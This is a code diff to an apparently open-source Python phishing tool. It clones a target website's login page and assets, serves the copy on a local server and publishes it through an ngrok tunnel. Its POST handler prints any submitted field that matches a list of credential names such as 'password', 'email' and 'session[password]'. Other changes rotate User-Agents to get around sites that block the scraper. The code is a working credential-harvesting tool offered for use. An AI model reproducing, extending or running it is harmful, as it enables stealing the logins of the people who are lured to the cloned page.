@@ -1,8 +1,11 @@
+import http.server
 from http.server import HTTPServer
-from http.server import BaseHTTPRequestHandler
 from urllib.request import urlopen
-from socket import timeout
-import ssl
+from pathlib import Path
+from pyngrok import ngrok
+import requests
+import shutil
+import urllib
 import threading
 import time
 import sys
@@ -15,77 +18,408 @@ local = 0
 port = 0
 page = ''
 users = []
-references = "user","email","number","pass","passwd","password"
 
+# keep increasing if something dont grab :)
+
+references = "username","user","user_login","email","number","user_password","user_pass","pass","passwd","password","pwd","session[password]","session[username_or_email]"
+
+# User-Agents
+a_user_agents = {
+    0:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+}
+
+def recursive_downloader(target_url):
+    # start the main funcionality, recursive download
+    
+    default_agent = a_user_agents[0]
+
+    print("[+] Starting recursive download")
+    print("[+] Scanning all content")
+    
+    scrapper_url = target_url
+    size = len(scrapper_url) - 1
+        
+    #if scrapper_url.endswith(".php") or scrapper_url.endswith(".html"):
+    while size > 0:
+        if scrapper_url[size] == "/":
+            break
+        else:
+            scrapper_url = scrapper_url[:size]
+            
+        size = size - 1
+
+    print("[+] New url for current directory : {}".format(scrapper_url))
+
+    try:
+        f = open("index.html","r").read() # read the main page
+    except UnicodeDecodeError:
+        print("[!] Error UnicodeDecodeError in index.html, trying with UTF-8...")
+        
+        try:
+            f = open("index.html","r").read().decode('UTF-8','ignore') # read the main page
+        except UnicodeDecodeError:
+            try:
+                print("[!] Error again with UTF-8")
+                print("[+] Downloading new webpage and bypassing...")
+                    
+                temp = urllib.request.urlopen(target_url)
+                f = temp.read().decode()
+                
+                print("[+] Got new webpage, starting parsing")
+                
+            except:
+                print("[!] Fatal error (Connection Timeout or Reseted). Quiting")
+                sys.exit()
+    
+    # download css files first
+    
+    myre = re.findall(r'href="[\'"]?([^\'">]+).css"',f)
+    myre_images = re.findall(r'src="[\'"]?([^\'">]+).png"',f)
+    myre_js = re.findall(r'script src="[\'"]?([^\'">]+).js"',f)
+    
+    #myre_general = re.findall(r'src="[\'"]?([^\'">]+)"',f) Next release
+    
+    a = len(myre)
+    a_images = len(myre_images)
+    a_js = len(myre_js)
+    #a_general = len(myre_general) Next release
+    
+    print("[+] Found ",a," css files to download")
+    counter = 1
+    new_f = f # backup file to replace ever css location tag
+    
+    #============================================================================================
+    #                                  Recursive downloader
+    #============================================================================================
+    # this was an pain in the butt    
+    
+    # for CSS files
+    if a != 0:
+        for i in myre:
+            
+            old_dir = i+'.css'
+            new_dir = './wdata/'+i.replace("https://","")
+            new_dir = './wdata/'+i.replace("http://","")
+            
+            if i.startswith("https://") or i.startswith("http://"):
+                request = urllib.request.Request(i+'.css',headers={
+                "User-Agent":default_agent,
+                "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
+                })
+            else:
+                request = urllib.request.Request(scrapper_url+i+'.css',headers={
+                "User-Agent":default_agent,
+                "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
+                })
+            
+            print("[+] {} -> {}".format(counter,i+'.css'))
+            counter = counter + 1
+            
+            # here, we will download the css files and store it back
+            
+            try:
+            
+                response = urllib.request.urlopen(request,timeout=60)
+                html = response.read()
+                new_f = re.sub(old_dir,new_dir+'.css',new_f)
+                
+                try:
+                    os.makedirs(new_dir)            
+                except FileExistsError:
+                    pass
+                try:
+                    html = html.decode('CP949')
+                except UnicodeDecodeError:
+                    html = html.decode('UTF-8')
+                
+                #urllib.request.urlretrieve(scrapper_url+i+'.css',new_dir+'.css')
+                filepath = new_dir+'.css'
+                
+                temp = open(filepath,"w")
+                temp.write(html)
+                temp.close()
+            except:
+                print("[!] Cannot download and modify {}".format(i))
+                print("[+] Trying to grab from main url, generating link")
+                
+                count = 3
+                new_link = ""
+                
+                for x in scrapper_url:
+                    if count == 0:
+                        break
+                    elif x == "/":
+                        new_link = new_link + x
+                        count = count - 1
+                    else:
+                        new_link = new_link + x
+                        
+                new_link = new_link[:len(new_link)-1]
+                print("[+] New link: ",new_link)
+                
+                try:
+                    request = urllib.request.Request(new_link+i+'.css',headers={
+            "User-Agent":default_agent,
+            "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
+            })
+                
+                    response = urllib.request.urlopen(request,timeout=60)
+                    html = response.read()
+                    new_f = re.sub(old_dir,new_dir+'.css',new_f)
+                    
+                    try:
+                        os.makedirs(new_dir)            
+                    except FileExistsError:
+                        pass
+                    try:
+                        html = html.decode('CP949')
+                    except UnicodeDecodeError:
+                        html = html.decode('UTF-8')
+                
+                    filepath = new_dir+'.css'
+                    
+                    temp = open(filepath,"w")
+                    temp.write(html)
+                    temp.close()
+                    print("[+] Alternative download worked")
+                    
+                except:
+                    print("[!] Cannot download (if starts with https:// or http:// dont worry)")                
+        
+        counter = 1
+    else:
+        print("[!] No CSS found!")
+    
+    # for images
+    if a_images != 0:
+        print("[+] Found ",a_images," images to download")
+        
+        for i in myre_images:
+            extension = ".png" # by default, to avoid error
+            
+            if i.endswith(".png"):
+                extension = ".png"
+            elif i.endswith(".jpeg"):
+                extension = ".jpeg"
+                
+            if i[0] == "/":
+                i = i[1:]
+                
+            try:
+                request = urllib.request.Request(scrapper_url+i+extension,headers={
+                "User-Agent":default_agent,
+                "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
+                })
+                
+                print("[+] {} -> {}".format(counter,i+extension))
+                counter = counter + 1
+                
+                old_dir = i+extension
+                new_dir = './wdata/'+i.replace("https://","")
+                new_dir = './wdata/'+i.replace("http://","")
+                new_f = re.sub(old_dir,new_dir+extension,new_f)
+                
+                new_dir = re.sub("https://|http://","",new_dir)
+                
+                os.makedirs(new_dir)            
+                
+                if i.startswith("https://"):
+                    try:
+                        urllib.request.urlretrieve(i+extension,new_dir+extension)
+                    except:
+                        print("[!] Cannot download -> ",i+extension)
+                elif i.startswith("http://"):
+                    try:
+                        urllib.request.urlretrieve(i+extension,new_dir+extension)
+                    except:
+                        print("[!] Cannot download -> ",i+extension)
+                        
+                else:
+                    try:
+                        urllib.request.urlretrieve(scrapper_url+i+extension,new_dir+extension)
+                    except:
+                        print("[!] Cannot download -> ",scrapper_url+i+extension)
+            except:
+                print("[+] Trying to grab from main url, generating link")
+                
+                count = 3
+                new_link = ""
+                
+                for x in scrapper_url:
+                    if count == 0:
+                        break
+                    elif x == "/":
+                        new_link = new_link + x
+                        count = count - 1
+                    else:
+                        new_link = new_link + x
+                        
+                new_link = new_link[:len(new_link)-1]
+                print("[+] New link: ",new_link)
+                     
+    else:
+        print("[!] No images found!")
+        
+    # for javascript
+    if a_js != 0:
+        for i in myre_js:
+            
+            #old_dir = i+'.js' # for debug
+            old_dir = i+'.js'
+            new_dir = './wdata/'+i.replace("https://","")
+            new_dir = './wdata/'+i.replace("http://","")
+            
+            request = urllib.request.Request(scrapper_url+i,headers={
+            "User-Agent":default_agent,
+            "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
+            })
+            
+            print("[+] {} -> {}".format(counter,i))
+            counter = counter + 1
+            
+            # here, we will download the css files and store it back
+            try:
+                response = urllib.request.urlopen(request,timeout=60)
+                html = response.read()
+                #new_f = re.sub(old_dir,new_dir+'.css',new_f)
+                new_f = re.sub(old_dir,new_dir,new_f)
+                
+                try:
+                    os.makedirs(new_dir)            
+                except FileExistsError:
+                    pass
+                try:
+                    html = html.decode('CP949')
+                except UnicodeDecodeError:
+                    html = html.decode('UTF-8')
+                
+                filepath = new_dir+'.js'
+                
+                temp = open(filepath,"w")
+                temp.write(html)
+                temp.close()
+            except:
+                print("[!] Cannot download (if starts with https:// or http:// dont worry)")     
+        
+        counter = 1
+    else:
+        print("[!] No Javascript files found!")
+    
+    # for other files
+    print("[+] Finished - Retrieved {} files".format(a+a_js+a_images))
+    
+    # modify the webpage t correctly find the location of all files
+    
+    a = open("./index.html","w")
+    
+    with open('./index.html','wb') as a:
+        a.write(new_f.encode())
+        
+    print("[+] Finished recursive download, starting server")
 
 def download_url(url):
     global page
+    default_agent = a_user_agents[0]
+    html = ""
 
     print("[!] Downloading...")
     
+    request = urllib.request.Request(url,headers={
+        "User-Agent":default_agent,
+        "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
+        })
+    
     try:
-        html = urlopen(url).read().decode('utf-8')
+        target = urllib.request.urlopen(request,timeout=60)
+        html = target.read()
+        html = re.sub('action="[\'"]?([^\'">]+)','action="{}"'.format(url),html)
+    except ConnectionResetError:
+        print("[!] Remote host blocked our connection")
+        print("[+] Trying to bypass with User-Agent rotation...")
         
-        print("[!] Parsing the content...")
-
-        parser = re.sub('href=\"[a-zA-Z0-9\:\/\?\&\.\<\=\;\"]{1,}','href="'+url+'"',html)
-
-        if os.path.exists("./html/index.html"):
-            os.remove("./html/index.html")
-            print("[!] Deleted!")
-
-        n = open("./html/index.html","w")
-        n.write(parser)
-        n.close
-
-        page = parser
-
+        # stage one of User-Agent rotation
+        r = len(a_user_agents)
+        
+        while(r > -2):
+            default_agent = a_user_agents[r-1]
+            try:
+                target = urllib.request.urlopen(request,timeout=60)
+                html = target.read()
+                html = re.sub('action="[\'"]?([^\'">]+)','action="{}"'.format(url),html)
+                print("[+] Sucefully bypassed")
+                break
+            except ConnectionResetError:
+                pass
+            r = r - 1
+            
+            if(r == -1):
+                print("[!] Cannot download url, try again later!")
+                sys.exit()
     except:
-        print("[!] Cannot download url, please check your internet/url")
+        print("[Fatal] Cannot download! Possible erros: Timeout Error, connection reset, or internal")
+    
+    try:
+        html = html.decode('CP949','ignore')
+    except UnicodeDecodeError:
+        html = html.decode('UTF-8','ignore')
+    
+    print("[!] Parsing the content...")
 
-        print("\n")
-        sys.exit(0)
+    parser = html
+    parser.replace("GET","POST")
+    parser.replace("get","post")
 
-"""Special features, here we set the main function to handle the other tools using threads"""
+    if os.path.exists("./index.html"):
+        os.remove("./index.html")
+        try:
+            shutil.rmtree("./wdata/")
+        except:
+            pass
+        
+        print("[!] Found old files, deleting!")
+    else:
+        print("[!] No recent files detected, skipping")
+    
+    try:
+        urllib.request.urlretrieve(url,'./index.html')
+    except ConnectionResetError:
+        print("[!] Remote host blocked our connection")
+        print("[+] Trying to bypass with User-Agent rotation...")
+        
+        # stage one of User-Agent rotation
+        r = len(a_user_agents)
+        
+        while(r > -2):
+            default_agent = a_user_agents[r-1]
+            try:
+                urllib.request.urlretrieve(url,'./index.html')
+                print("[+] Sucefully bypassed")
+                break
+            except ConnectionResetError:
+                pass
+            r = r - 1
+            
+            if(r == -1):
+                print("[!] Cannot download url, try again later!")
+                sys.exit()
+                
+    print("[!] Finished parsing")
 
-def extender(_client_ip):
-    if status[0] == True:
-        from core import _arp_spoof as ap
-        t = threading.Thread(target=ap._user,args=(_client_ip,local,port,dns,))
-    if status[1] == True:
-        from core import _port_scanning as sc
-        t = threading.Thread(target=sc.call, args=(_client_ip,))
-        t.start()
-
-def run(LHOST, LPORT,_status, url,_dns):
+def run(LHOST, LPORT, url):
     LHOST = str(LHOST)
     LPORT = int(LPORT)
-    if LPORT == 0:
-        print("[!] No port configured, using 8080")
-        LPORT = 80
 
-    global status
-    global costum
-
-    dns = _dns
     port = LPORT
     local = LHOST
 
-    costum = _status[4]
 
-    if costum == False:
-        download_url(url)
-
-    status = _status
+    download_url(url)
+    recursive_downloader(url)
 
     try:
-        #check if we are using ssl
-        if _status[3] == True:
-            httpd = HTTPServer((LHOST,443),handler)
-            httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./cert/cert.pem", keyfile="./cert/cert.perm", server_side=True)
-
-        else:
-            httpd = HTTPServer((LHOST,LPORT),handler)
+        httpd = HTTPServer((LHOST,LPORT),handler)
+        
     except:
         print("\033[1;31m[!] Cannot bind server!\033[m")
         if(LPORT == 80):
@@ -94,8 +428,22 @@ def run(LHOST, LPORT,_status, url,_dns):
             print("\033[1;31m[!] Try another port\033[m")
         return
 
-    print('\033[1;37m[+] Starting NERO at',time.asctime(),'\033[m')
-    print("\033[1;37m[+] Current page directory: nero/html\033[m")
+    print('\033[1;37m[+] Server started at',time.asctime(),'\033[m')
+    print("\033[1;37m[+] Current page directory: /\033[m")
+    
+    # setup ngrok
+    configuration = {
+        "remote_addr":LPORT,
+        "bind_tls":True
+    }
+    
+    try:
+        public_url = ngrok.connect(options=configuration)
+    except:
+        print("[!] Cannot generate url")
+        
+    tunnels = ngrok.get_tunnels()
+    print("[ => Ngrok link : {}".format(tunnels[0].public_url))
 
     try:
         httpd.serve_forever()
@@ -109,31 +457,22 @@ def run(LHOST, LPORT,_status, url,_dns):
         log_file.close()
         print("\033[1;31m[!] Cannot start server!\033[m")
 
-class handler(BaseHTTPRequestHandler):    
-
-    def _set_headers(self):
-        self.send_response_only(200)
-        self.send_header('Content-type','text/html')
-        self.end_headers()
-
-    def do_HEAD(self):
-        return
-
+class handler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        print("\033[1;34m[+] Connection from: {}\033[m".format(self.client_address[0]))
-
+                
+        if self.path == "/":
+            self.path = "/index.html"
+         
         if not self.client_address[0] in users:
-            extender(self.client_address[0])
             users.append(self.client_address[0])
+            print("\033[1;34m[+] Connection from: {}\033[m".format(self.client_address[0]))
         
         else:
-            users.append(self.client_address[0])
-
-        self.respond()
-
+            print("\033[1;34m[+] Client doing something: {}\033[m".format(self.client_address[0])) 
+        
+        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        
     def do_POST(self):
-        print("\033[1;33;41[+] NERO got something...!\033[m")
-
         form = cgi.FieldStorage(self.rfile,
         headers=self.headers,
         environ={'REQUEST_METHOD':'POST',
@@ -142,7 +481,7 @@ class handler(BaseHTTPRequestHandler):
 
         form = re.sub("FieldStorage|None|MiniFieldStorage|[\(\)\[\]\,\']",'',form)
         form = form.split(" ")
-        
+          
         x = 0
         try:
             while x < len(form):
@@ -150,36 +489,7 @@ class handler(BaseHTTPRequestHandler):
                     if form[x] in references:
                         print("\033[1;31m[*] {} => {}\033[m".format(form[x],form[x+1]))
                     else:
-                        print("\033[1;32m[*] {} => {}\033[m".format(form[x],form[x+1]))
+                        pass
                 x = x+2
         except:
             pass
-
-    def handle_http(self,status,content_type):
-        self._set_headers()
-
-        if costum == False:
-            return bytes(page,"UTF-8")
-
-        elif costum == True:
-            self.respond()
-
-            if self.path == "/":
-                try:
-                    file = open("./html/index.html").read()
-                    return bytes(file,"UTF-8")
-
-                except:
-                    return bytes("<p align='center'>Error 404 | Index not found</p>","UTF-8")
-
-            else:
-                try:
-                    file = open("./html"+self.path).read()
-                    return bytes(file,"UTF-8")
-
-                except:
-                    return bytes("<p align='center'>Error 404</p>","UTF-8")
-
-    def respond(self):
-        content = self.handle_http(200,'text/html')
-        self.wfile.write(content)
